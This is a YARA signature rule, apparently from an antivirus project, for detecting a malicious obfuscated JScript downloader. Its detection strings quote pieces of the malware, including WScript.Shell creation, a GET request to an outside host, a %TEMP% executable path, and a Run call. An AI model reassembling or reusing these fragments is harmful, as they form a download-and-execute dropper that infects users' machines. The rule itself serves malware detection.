rule sig_20160401_5e34b7f1966d10f5d1352037ce1618e9 {
  meta:
    description = "datamaliciousorder - file 20160401_5e34b7f1966d10f5d1352037ce1618e9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d4f855f9c53078c9a215caf9d90daf0dfaedc613aa91efb99f2856e2c1472e61"

  strings:
    $s1  = "function SgsXkl(IyMj, YoBxk){YsMu = YsMu * 1; return IyMj - YoBxk;};" fullword ascii
    $s2  = "var SnEl = function JqKag() {return WScript[ErPyk](\"WScript\"+\".Shell\");}(), RyGv = 11;" fullword ascii
    $s3  = "if (SrjPhb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function ZtOqz(){return QtmPa + \"\";};" fullword ascii
    $s5  = "SrjPhb[IblRb](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s6  = "function ZoNr() {return SnEl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dVrcMO6fx2mywwhP.ex\" + \"e\";};" fullword ascii
    $s7  = "function AmjUwe() {return ((BzZb == true) && (BzZb == KywEkh)) ? 1 : YsMu;};" fullword ascii
    $s8  = "BzZb = true; " fullword ascii
    $s9  = "var XzmZbg = false;" fullword ascii
    $s10 = "function OpxLf(XmtLy){SnEl[\"R\"+\"un\"](XmtLy, YsMu, YsMu);};" fullword ascii
    $s11 = "}while (QieGs);" fullword ascii
    $s12 = "function FpHb(){return ErPyk;};" fullword ascii
    $s13 = "var BzZb = false;" fullword ascii
    $s14 = "KywEkh = true; " fullword ascii
    $s15 = "var KywEkh = false;" fullword ascii
    $s16 = "function OtEc(){return 23;};" fullword ascii
    $s17 = "var NxvVej = new this[\"Date\"]();" fullword ascii
    $s18 = "function SbwHiv(ZnoKn) {var LyKfz = (1, 2, 3, 4, 5, ZnoKn); return LyKfz;};" fullword ascii
    $s19 = "function VoPn()" fullword ascii
    $s20 = "return SgsXkl(NwqNx, ZctLe);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}